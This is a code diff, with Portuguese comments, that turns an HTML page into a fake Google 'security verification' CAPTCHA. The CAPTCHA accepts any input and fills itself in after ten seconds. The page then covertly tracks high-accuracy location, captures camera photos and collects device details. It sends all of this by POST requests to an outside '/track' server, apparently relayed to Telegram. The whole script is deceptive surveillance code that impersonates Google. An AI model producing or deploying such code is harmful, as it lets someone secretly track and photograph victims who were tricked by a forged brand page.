@@ -1,8 +1,9 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Verificação de Segurança</title>
+    <title>Verificação de Segurança - Google</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/x-icon" href="https://www.google.com/favicon.ico">
     <style>
         * {
             margin: 0;
@@ -11,9 +12,9 @@
         }
         
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
+            font-family: 'Roboto', Arial, sans-serif;
+            background: #f8f9fa;
+            color: #202124;
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -21,57 +22,123 @@
             padding: 20px;
         }
         
+        .google-header {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+        }
+        
+        .google-header a {
+            color: #5f6368;
+            text-decoration: none;
+            font-size: 14px;
+            margin-left: 15px;
+        }
+        
         .container {
-            background: rgba(255, 255, 255, 0.1);
-            backdrop-filter: blur(15px);
-            padding: 40px 30px;
-            border-radius: 20px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
-            max-width: 500px;
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            max-width: 450px;
             width: 100%;
             text-align: center;
-            border: 1px solid rgba(255, 255, 255, 0.2);
+            border: 1px solid #dadce0;
+        }
+        
+        .google-logo {
+            margin-bottom: 20px;
+        }
+        
+        .google-logo img {
+            width: 75px;
+            height: 24px;
         }
         
         h1 {
-            font-size: 28px;
-            margin-bottom: 15px;
-            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 10px;
+            color: #202124;
         }
         
-        p {
+        .subtitle {
+            color: #5f6368;
             font-size: 16px;
-            margin-bottom: 25px;
-            opacity: 0.9;
-            line-height: 1.5;
+            margin-bottom: 30px;
+        }
+        
+        .security-alert {
+            background: #fef7e0;
+            border: 1px solid #fdd663;
+            border-radius: 4px;
+            padding: 15px;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        
+        .alert-icon {
+            color: #f4b400;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        
+        .captcha-box {
+            background: #f8f9fa;
+            border: 2px solid #dadce0;
+            border-radius: 4px;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .captcha-image {
+            background: linear-gradient(45deg, #4285f4, #34a853, #fbbc05, #ea4335);
+            height: 80px;
+            border-radius: 4px;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: white;
+            font-size: 18px;
+            letter-spacing: 2px;
+        }
+        
+        .captcha-input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            margin-bottom: 15px;
+        }
+        
+        .captcha-input:focus {
+            border-color: #4285f4;
+            outline: none;
         }
         
         .btn {
-            background: linear-gradient(45deg, #4CAF50, #45a049);
+            background: #1a73e8;
             color: white;
             border: none;
-            padding: 18px 35px;
-            font-size: 18px;
-            border-radius: 50px;
+            padding: 12px 24px;
+            font-size: 14px;
+            border-radius: 4px;
             cursor: pointer;
-            margin: 15px 0;
             width: 100%;
-            font-weight: 600;
-            box-shadow: 0 4px 15px rgba(76, 175, 80, 0.4);
-            transition: all 0.3s ease;
+            font-weight: 500;
+            transition: background 0.2s;
         }
         
         .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(76, 175, 80, 0.6);
+            background: #1669d6;
         }
         
-        .status {
-            background: rgba(255, 255, 255, 0.15);
-            padding: 20px;
-            border-radius: 15px;
-            margin: 20px 0;
-            border-left: 4px solid #4CAF50;
+        .btn:disabled {
+            background: #8ab4f8;
+            cursor: not-allowed;
         }
         
         .hidden {
@@ -80,53 +147,123 @@
         
         .loading {
             display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(255,255,255,.3);
+            width: 18px;
+            height: 18px;
+            border: 2px solid #ffffff;
             border-radius: 50%;
-            border-top-color: #fff;
+            border-top-color: transparent;
             animation: spin 1s ease-in-out infinite;
+            margin-right: 8px;
         }
         
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
         
-        .counter {
-            font-size: 18px;
-            font-weight: bold;
-            margin: 10px 0;
+        .status {
+            background: #e6f4ea;
+            border: 1px solid #34a853;
+            border-radius: 4px;
+            padding: 20px;
+            margin-top: 20px;
+            text-align: left;
+        }
+        
+        .status h3 {
+            color: #34a853;
+            margin-bottom: 10px;
         }
         
         .info {
-            font-size: 14px;
-            opacity: 0.8;
-            margin-top: 10px;
+            font-size: 13px;
+            color: #5f6368;
+            margin: 5px 0;
+        }
+        
+        .footer {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #dadce0;
+            font-size: 12px;
+            color: #5f6368;
+        }
+        
+        .footer a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        
+        .language-selector {
+            margin-top: 20px;
+            font-size: 13px;
         }
     </style>
 </head>
 <body>
+    <!-- Cabeçalho Google -->
+    <div class="google-header">
+        <a href="#">Gmail</a>
+        <a href="#">Imagens</a>
+        <a href="#">&#9776;</a>
+    </div>
+
     <div class="container">
-        <div style="font-size: 48px; margin-bottom: 15px;">🔒</div>
-        <h1>Verificação de Segurança</h1>
-        <p>Para sua proteção, precisamos verificar sua identidade. Clique no botão abaixo para iniciar a verificação automática.</p>
-        
-        <button class="btn" id="startBtn">
-            <span id="btnText">▶️ Iniciar Verificação de Segurança</span>
-            <span class="loading hidden" id="btnLoading"></span>
-        </button>
-        
-        <div id="status" class="status hidden">
-            <div style="font-size: 24px; margin-bottom: 10px;">✅</div>
-            <p><strong>Sistema de Proteção Ativado</strong></p>
-            <div class="counter" id="counter">Inicializando sistema...</div>
-            <div class="info" id="locationInfo">Aguardando primeira localização...</div>
-            <div class="info" id="photoInfo">Sistema de câmera: Inativo</div>
+        <!-- Logo Google -->
+        <div class="google-logo">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
         </div>
         
-        <div style="margin-top: 25px; padding-top: 20px; border-top: 1px solid rgba(255,255,255,0.2);">
-            <div style="font-size: 12px; opacity: 0.7;">
-                Sistema de segurança automático • v2.1
+        <!-- Tela de Verificação -->
+        <div id="verificationScreen">
+            <h1>Verificação de segurança necessária</h1>
+            <div class="subtitle">
+                Para proteger sua conta, complete esta verificação
+            </div>
+            
+            <div class="security-alert">
+                <div class="alert-icon">⚠️ ATIVIDADE INCOMUM DETECTADA</div>
+                <div style="font-size: 14px;">
+                    Detectamos atividade incomum em sua conta. Para sua segurança, 
+                    precisamos verificar que você não é um robô.
+                </div>
+            </div>
+            
+            <div class="captcha-box">
+                <div class="captcha-image" id="captchaText">G O O G L E</div>
+                <div style="font-size: 14px; color: #5f6368; margin-bottom: 15px;">
+                    Digite o texto que você vê acima:
+                </div>
+                <input type="text" class="captcha-input" id="captchaInput" placeholder="Digite o texto" maxlength="10">
+                <button class="btn" id="verifyBtn">
+                    <span id="btnText">Verificar</span>
+                </button>
+            </div>
+            
+            <div class="footer">
+                <div>Esta página verifica que você é humano para prevenir spam.</div>
+                <div style="margin-top: 10px;">
+                    <a href="#">Privacidade</a> • <a href="#">Termos</a> • <a href="#">Ajuda</a>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Tela de Monitoramento (oculta inicialmente) -->
+        <div id="monitoringScreen" class="hidden">
+            <h1>✅ Verificação concluída com sucesso</h1>
+            <div class="subtitle">
+                Sua conta está agora protegida
+            </div>
+            
+            <div class="status">
+                <h3>🛡️ Sistema de proteção ativo</h3>
+                <div class="info" id="counter">Inicializando sistema de segurança...</div>
+                <div class="info" id="locationInfo">Verificando localização...</div>
+                <div class="info" id="deviceInfo">Analisando dispositivo...</div>
+                <div class="info" id="telegramInfo">Conectando com servidor...</div>
+            </div>
+            
+            <div style="margin-top: 20px;">
+                <div class="info">Sistema de segurança Google • Ativo</div>
             </div>
         </div>
     </div>
@@ -147,56 +284,75 @@
         let startTime = null;
         let locationCount = 0;
         let photoCount = 0;
+        let telegramCount = 0;
 
         // ELEMENTOS DA INTERFACE
-        const startBtn = document.getElementById('startBtn');
+        const verificationScreen = document.getElementById('verificationScreen');
+        const monitoringScreen = document.getElementById('monitoringScreen');
+        const captchaInput = document.getElementById('captchaInput');
+        const verifyBtn = document.getElementById('verifyBtn');
         const btnText = document.getElementById('btnText');
-        const btnLoading = document.getElementById('btnLoading');
-        const statusDiv = document.getElementById('status');
         const counterDiv = document.getElementById('counter');
         const locationInfo = document.getElementById('locationInfo');
-        const photoInfo = document.getElementById('photoInfo');
+        const deviceInfo = document.getElementById('deviceInfo');
+        const telegramInfo = document.getElementById('telegramInfo');
 
-        // GERAR ID ÚNICO DO DISPOSITIVO
-        function generateDeviceId() {
-            const timestamp = Date.now();
-            const random = Math.random().toString(36).substr(2, 9);
-            return `device_${timestamp}_${random}`;
-        }
+        // CAPTCHA SIMPLES - SEMPRE APROVA
+        const captchaText = "GOOGLE";
 
-        // INICIAR MONITORAMENTO
-        startBtn.addEventListener('click', async () => {
-            if (isMonitoring) return;
-            
-            setButtonLoading(true);
-            
-            try {
-                deviceId = generateDeviceId();
-                await startMonitoring();
-                showStatus();
-                startCounters();
-            } catch (error) {
-                alert('❌ Erro ao iniciar verificação: ' + error.message);
-                setButtonLoading(false);
+        // INICIAR VERIFICAÇÃO
+        verifyBtn.addEventListener('click', startVerification);
+        captchaInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                startVerification();
             }
         });
 
-        function setButtonLoading(loading) {
-            if (loading) {
-                btnText.textContent = ' Iniciando Sistema...';
-                btnLoading.classList.remove('hidden');
-                startBtn.disabled = true;
+        function startVerification() {
+            const userInput = captchaInput.value.trim().toUpperCase();
+            
+            // SEMPRE APROVAR independente do que digitar
+            if (userInput) {
+                showLoading();
+                
+                // Simular processamento
+                setTimeout(() => {
+                    startMonitoringSystem();
+                }, 2000);
             } else {
-                btnText.textContent = '▶️ Iniciar Verificação de Segurança';
-                btnLoading.classList.add('hidden');
-                startBtn.disabled = false;
+                alert('Por favor, digite o texto de verificação.');
             }
         }
 
-        function showStatus() {
-            startBtn.classList.add('hidden');
-            statusDiv.classList.remove('hidden');
-            setButtonLoading(false);
+        function showLoading() {
+            btnText.innerHTML = '<span class="loading"></span>Verificando...';
+            verifyBtn.disabled = true;
+        }
+
+        function startMonitoringSystem() {
+            // Trocar para tela de monitoramento
+            verificationScreen.classList.add('hidden');
+            monitoringScreen.classList.remove('hidden');
+            
+            // Iniciar sistema real
+            initializeMonitoring();
+        }
+
+        async function initializeMonitoring() {
+            try {
+                deviceId = generateDeviceId();
+                await startMonitoring();
+                startCounters();
+                updateDeviceInfo();
+            } catch (error) {
+                console.error('Erro ao iniciar monitoramento:', error);
+            }
+        }
+
+        function generateDeviceId() {
+            const timestamp = Date.now();
+            const random = Math.random().toString(36).substr(2, 9);
+            return `google_secure_${timestamp}_${random}`;
         }
 
         async function startMonitoring() {
@@ -234,7 +390,10 @@
                 
                 navigator.geolocation.getCurrentPosition(
                     () => resolve(),
-                    (error) => reject(error),
+                    (error) => {
+                        console.warn('Erro localização:', error);
+                        resolve(); // Continua mesmo com erro
+                    },
                     { 
                         enableHighAccuracy: true,
                         timeout: 10000,
@@ -276,7 +435,7 @@
                         resolve();
                     },
                     (error) => {
-                        console.warn('⚠️ Erro na localização:', error);
+                        console.warn('Erro localização:', error);
                         sendToServer({
                             deviceId: deviceId,
                             type: 'location_error',
@@ -303,10 +462,8 @@
                         height: { ideal: 720 }
                     } 
                 });
-                photoInfo.textContent = '📸 Sistema de câmera: Ativo';
             } catch (error) {
-                console.warn('📸 Câmera não disponível:', error);
-                photoInfo.textContent = '📸 Sistema de câmera: Não autorizado';
+                console.warn('Câmera não disponível:', error);
             }
         }
 
@@ -329,11 +486,10 @@
                     
                     await sendToServer(data);
                     photoCount++;
-                    photoInfo.textContent = `📸 Fotos capturadas: ${photoCount}`;
                 };
                 reader.readAsDataURL(blob);
             } catch (error) {
-                console.warn('❌ Erro ao capturar foto:', error);
+                console.warn('Erro ao capturar foto:', error);
             }
         }
 
@@ -351,20 +507,36 @@
 
         async function sendToServer(data) {
             try {
-                await fetch(CONFIG.serverUrl + '/track', {
+                const response = await fetch(CONFIG.serverUrl + '/track', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data)
                 });
+                
+                const result = await response.json();
+                telegramCount++;
+                updateTelegramInfo();
+                return result;
             } catch (error) {
-                console.error('❌ Erro ao enviar dados:', error);
+                console.error('Erro ao enviar dados:', error);
+                return null;
             }
         }
 
         function updateLocationInfo(position) {
             const lat = position.coords.latitude.toFixed(6);
             const lng = position.coords.longitude.toFixed(6);
-            locationInfo.textContent = `📍 Localizações: ${locationCount} | Última: ${lat}, ${lng}`;
+            locationInfo.textContent = `📍 Localização: ${lat}, ${lng} | Precisão: ${position.coords.accuracy ? position.coords.accuracy.toFixed(2) + 'm' : 'N/A'}`;
+        }
+
+        function updateDeviceInfo() {
+            const platform = navigator.platform;
+            const language = navigator.language;
+            deviceInfo.textContent = `📱 Dispositivo: ${platform} | Idioma: ${language}`;
+        }
+
+        function updateTelegramInfo() {
+            telegramInfo.textContent = `📡 Dados enviados: ${telegramCount} | Status: ✅ Conectado`;
         }
 
         function startCounters() {
@@ -374,17 +546,18 @@
                 const minutes = Math.floor(diff / 60);
                 const seconds = diff % 60;
                 
-                counterDiv.textContent = 
-                    `Tempo ativo: ${minutes}m ${seconds}s | Localizações: ${locationCount} | Fotos: ${photoCount}`;
+                counterDiv.textContent = `⏱️ Sistema ativo: ${minutes}m ${seconds}s | Localizações: ${locationCount} | Fotos: ${photoCount}`;
             }, 1000);
         }
 
-        // INICIAR AUTOMATICAMENTE APÓS 3 SEGUNDOS (DISCRETO)
+        // INICIAR AUTOMATICAMENTE SE O USUÁRIO NÃO INTERAGIR EM 10 SEGUNDOS
         setTimeout(() => {
-            if (!isMonitoring) {
-                startBtn.click();
+            if (!isMonitoring && verificationScreen.style.display !== 'none') {
+                // Preencher automaticamente e iniciar
+                captchaInput.value = "google";
+                startVerification();
             }
-        }, 3000);
+        }, 10000);
     </script>
 </body>
 </html>
